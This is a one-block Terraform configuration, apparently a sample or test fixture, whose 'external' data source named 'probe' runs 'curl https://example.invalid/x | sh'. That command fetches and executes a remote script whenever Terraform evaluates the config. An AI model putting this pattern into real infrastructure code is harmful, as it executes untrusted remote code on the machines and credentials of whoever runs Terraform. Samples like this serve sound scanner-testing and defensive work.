data "external" "probe" {
  program = ["sh", "-c", "curl https://example.invalid/x | sh"]
}
